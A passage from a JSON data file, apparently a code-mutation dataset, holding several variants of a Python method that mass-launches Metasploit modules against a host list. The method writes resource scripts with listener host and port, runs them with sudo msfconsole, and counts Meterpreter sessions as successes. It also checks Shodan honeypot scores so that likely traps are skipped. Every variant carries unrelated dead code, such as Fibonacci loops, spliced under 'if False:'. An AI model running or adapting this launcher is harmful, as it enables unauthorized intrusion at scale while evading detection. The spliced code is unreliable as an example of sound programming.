[ansi_escape.sub('', x) for x in output if re.search('\\\\[.\\\\]', x)]\n                    msf_wins = [x for x in msf_output_lines if re.search('\\\\[\\\\+\\\\]', x) or 'Meterpreter' in x or 'Session' in x or ('Sending stage' in x)]\n                    msf_fails = [x for x in msf_output_lines if re.search('\\\\[-\\\\]', x) and 'Background' not in x]\n                    if len(msf_wins):\n                        win_total += 1\n                    if len(msf_fails):\n                        fail_total += 1\n                    csv_file = csv.writer(f, quoting=csv.QUOTE_ALL)\n                    csv_file.writerow([rhost, today_printable, module_name, lhost, lport, linesep.join(msf_wins), linesep.join(msf_fails), linesep.join(msf_output_lines)])\n    print('')\n    lib.output.info('{}RESULTS{}'.format(sep, sep))\n    if self.dry_run:\n        lib.output.info('\\tDRY RUN!')\n        lib.output.info('\\t0 exploits run against {} hosts.'.format(len(self.hosts)))\n    else:\n        lib.output.info('\\t{} exploits run against {} hosts.'.format(len(self.mods), len(self.hosts) - skip_amount))\n        lib.output.info('\\t{} exploit successful (Check report.csv to validate!).'.format(win_total))\n        lib.output.info('\\t{} exploit failed.'.format(fail_total))\n    lib.output.info('\\tExploit run saved to {}'.format(str(current_run_path)))\n    lib.output.info('\\tReport saved to {}'.format(str(report_path)))",
            "def start_exploit(self, sep='*' * 10):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n    \"\\n        start the exploit, there is still no rollover but it's being worked\\n        \"\n    if self.dry_run:\n        lib.settings.close('dry run was initiated, exploitation will not be done')\n    today_printable = datetime.datetime.today().strftime('%Y-%m-%d_%Hh%Mm%Ss')\n    current_run_path = path.join(lib.settings.RC_SCRIPTS_PATH, today_printable)\n    try:\n        makedirs(current_run_path)\n    except OSError:\n        current_run_path = path.join(lib.settings.RC_SCRIPTS_PATH, today_printable + '(1)')\n        makedirs(current_run_path)\n    report_path = path.join(current_run_path, 'report.csv')\n    with open(report_path, 'w') as f:\n        csv_file = csv.writer(f, quoting=csv.QUOTE_ALL)\n        csv_file.writerow(['Target Host', 'Date (UTC)', 'MSF Module', 'LocalHost', 'Listening Port', 'Successful Logs', 'Failure Logs', 'All Logs'])\n    lib.output.info('Launching exploits against {hosts_len} hosts:'.format(hosts_len=len(self.hosts)))\n    win_total = 0\n    fail_total = 0\n    skip_amount = 0\n    lib.settings.MSF_LAUNCHED = True\n    for host in self.hosts:\n        host = host.strip()\n        if self.check_honey:\n            lib.output.misc_info('checking if {} is a honeypot'.format(host))\n            honey_score = api_calls.honeyscore_hook.HoneyHook(host, self.shodan_token).make_request()\n            if honey_score < self.compare_honey:\n                lib.output.warning('honeypot score ({}) is above (or equal to) requested, skipping target'.format(honey_score))\n                skip = True\n                skip_amount += 1\n            else:\n                lib.output.misc_info('{} does not appear to be a honeypot, continuing attack'.format(host))\n                skip = False\n        else:\n            skip = False\n        if not skip:\n            current_host_path = path.join(current_run_path, host.strip())\n            try:\n                makedirs(current_host_path)\n            except OSError:\n                pass\n            for mod in self.mods:\n                if not self.dry_run:\n                    lib.output.info(\"launching exploit '{}' against host '{}'\".format(mod.strip(), host.strip()))\n                cmd_template = 'sudo {use_ruby} {msf_path} -r {rc_script_path} -q'\n                use_ruby = 'ruby' if self.ruby_exec else ''\n                msf_path = self.msf_path if self.msf_path is not None else 'msfconsole'\n                rc_script_template = 'workspace -a {workspace}\\nuse {module_name}\\nsetg lhost {lhost}\\nsetg lport {lport}\\nsetg verbose true\\nsetg threads 20\\nset rhost {rhost}\\nset rhosts {rhosts}\\nrun -z\\nexit -y\\n'\n                module_name = mod.strip()\n                workspace = self.configuration[0]\n                lhost = self.configuration[1]\n                lport = self.configuration[2]\n                rhost = host.strip()\n                current_rc_script_path = path.join(current_host_path, mod.replace('/', '-').strip())\n                with open(current_rc_script_path, 'w') as f:\n                    f.writelines(rc_script_template.format(module_name=module_name, workspace=workspace, lhost=lhost, lport=lport, rhost=rhost, rhosts=rhost))\n                with open(report_path, 'a') as f:\n                    cmd = cmd_template.format(use_ruby=use_ruby, msf_path=msf_path, rc_script_path=current_rc_script_path)\n                    output = ['']\n                    if not self.dry_run:\n                        output = lib.settings.cmdline(cmd)\n                    ansi_escape = re.compile('\\\\x1B\\\\[[0-?]*[ -/]*[@-~]')\n                    msf_output_lines = [ansi_escape.sub('', x) for x in output if re.search('\\\\[.\\\\]', x)]\n                    msf_wins = [x for x in msf_output_lines if re.search('\\\\[\\\\+\\\\]', x) or 'Meterpreter' in x or 'Session' in x or ('Sending stage' in x)]\n                    msf_fails = [x for x in msf_output_lines if re.search('\\\\[-\\\\]', x) and 'Background' not in x]\n                    if len(msf_wins):\n                        win_total += 1\n                    if len(msf_fails):\n                        fail_total += 1\n                    csv_file = csv.writer(f, quoting=csv.QUOTE_ALL)\n                    csv_file.writerow([rhost, today_printable, module_name, lhost, lport, linesep.join(msf_wins), linesep.join(msf_fails), linesep.join(msf_output_lines)])\n    print('')\n    lib.output.info('{}RESULTS{}'.format(sep, sep))\n    if self.dry_run:\n        lib.output.info('\\tDRY RUN!')\n        lib.output.info('\\t0 exploits run against {} hosts.'.format(len(self.hosts)))\n    else:\n        lib.output.info('\\t{} exploits run against {} hosts.'.format(len(self.mods), len(self.hosts) - skip_amount))\n        lib.output.info('\\t{} exploit successful (Check report.csv to validate!).'.format(win_total))\n        lib.output.info('\\t{} exploit failed.'.format(fail_total))\n    lib.output.info('\\tExploit run saved to {}'.format(str(current_run_path)))\n    lib.output.info('\\tReport saved to {}'.format(str(report_path)))",
            "def start_exploit(self, sep='*' * 10):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n        length = 15\n        if length <= 0:\n            return []\n        elif length == 1:\n            return [0]\n        sequence = [0, 1]\n        while len(sequence) < length:\n            next_value = sequence[-1] + sequence[-2]\n            sequence.append(next_value)\n        return sequence\n    \"\\n        start the exploit, there is still no rollover but it's being worked\\n        \"\n    if self.dry_run:\n        lib.settings.close('dry run was initiated, exploitation will not be done')\n    today_printable = datetime.datetime.today().strftime('%Y-%m-%d_%Hh%Mm%Ss')\n    current_run_path = path.join(lib.settings.RC_SCRIPTS_PATH, today_printable)\n    try:\n        makedirs(current_run_path)\n    except OSError:\n        current_run_path = path.join(lib.settings.RC_SCRIPTS_PATH, today_printable + '(1)')\n        makedirs(current_run_path)\n    report_path = path.join(current_run_path, 'report.csv')\n    with open(report_path, 'w') as f:\n        csv_file = csv.writer(f, quoting=csv.QUOTE_ALL)\n        csv_file.writerow(['Target Host', 'Date (UTC)', 'MSF Module', 'LocalHost', 'Listening Port', 'Successful Logs', 'Failure Logs', 'All Logs'])\n    lib.output.info('Launching exploits against {hosts_len} hosts:'.format(hosts_len=len(self.hosts)))\n    win_total = 0\n    fail_total = 0\n    skip_amount = 0\n    lib.settings.MSF_LAUNCHED = True\n    for host in self.hosts:\n        host = host.strip()\n        if self.check_honey:\n            lib.output.misc_info('checking if {} is a honeypot'.format(host))\n            honey_score = api_calls.honeyscore_hook.HoneyHook(host, self.shodan_token).make_request()\n            if honey_score < self.compare_honey:\n                lib.output.warning('honeypot score ({}) is above (or equal to) requested, skipping target'.format(honey_score))\n                skip = True\n                skip_amount += 1\n            else:\n                lib.output.misc_info('{} does not appear to be a honeypot, continuing attack'.format(host))\n                skip = False\n        else:\n            skip = False\n        if not skip:\n            current_host_path = path.join(current_run_path, host.strip())\n            try:\n                makedirs(current_host_path)\n            except OSError:\n                pass\n            for mod in self.mods:\n                if not self.dry_run:\n                    lib.output.info(\"launching exploit '{}' against host '{}'\".format(mod.strip(), host.strip()))\n                cmd_template = 'sudo {use_ruby} {msf_path} -r {rc_script_path} -q'\n                use_ruby = 'ruby' if self.ruby_exec else ''\n                msf_path = self.msf_path if self.msf_path is not None else 'msfconsole'\n                rc_script_template = 'workspace -a {workspace}\\nuse {module_name}\\nsetg lhost {lhost}\\nsetg lport {lport}\\nsetg verbose true\\nsetg threads 20\\nset rhost {rhost}\\nset rhosts {rhosts}\\nrun -z\\nexit -y\\n'\n                module_name = mod.strip()\n                workspace = self.configuration[0]\n                lhost = self.configuration[1]\n                lport = self.configuration[2]\n                rhost = host.strip()\n                current_rc_script_path = path.join(current_host_path, mod.replace('/', '-').strip())\n                with open(current_rc_script_path, 'w') as f:\n                    f.writelines(rc_script_template.format(module_name=module_name, workspace=workspace, lhost=lhost, lport=lport, rhost=rhost, rhosts=rhost))\n                with open(report_path, 'a') as f:\n                    cmd = cmd_template.format(use_ruby=use_ruby, msf_path=msf_path, rc_script_path=current_rc_script_path)\n                    output = ['']\n                    if not self.dry_run:\n                        output = lib.settings.cmdline(cmd)\n                    ansi_escape = re.compile('\\\\x1B\\\\[[0-?]*[ -/]*[@-~]')\n                    msf_output_lines = [ansi_escape.sub('', x) for x in output if re.search('\\\\[.\\\\]', x)]\n                    msf_wins = [x for x in msf_output_lines if re.search('\\\\[\\\\+\\\\]', x) or 'Meterpreter' in x or 'Session' in x or ('Sending stage' in x)]\n                    msf_fails = [x for x in msf_output_lines if re.search('\\\\[-\\\\]', x) and 'Background' not in x]\n                    if len(msf_wins):\n                        win_total += 1\n                    if len(msf_fails):\n                        fail_total += 1\n                    csv_file = csv.writer(f, quoting=csv.QUOTE_ALL)\n                    csv_file.writerow([rhost, today_printable, module_name, lhost, lport, linesep.join(msf_wins), linesep.join(msf_fails), linesep.join(msf_output_lines)])\n    print('')\n    lib.output.info('{}RESULTS{}'.format(sep, sep))\n    if self.dry_run:\n        lib.output.info('\\tDRY RUN!')\n        lib.output.info('\\t0 exploits run against {} hosts.'.format(len(self.hosts)))\n    else:\n        lib.output.info('\\t{} exploits run against {} hosts.'.format(len(self.mods), len(self.hosts) - skip_amount))\n        lib.output.info('\\t{} exploit successful (Check report.csv to validate!).'.format(win_total))\n        lib.output.info('\\t{} exploit failed.'.format(fail_total))\n    lib.output.info('\\tExploit run saved to {}'.format(str(current_run_path)))\n    lib.output.info('\\tReport saved to {}'.format(str(report_path)))"
        ]
    }
]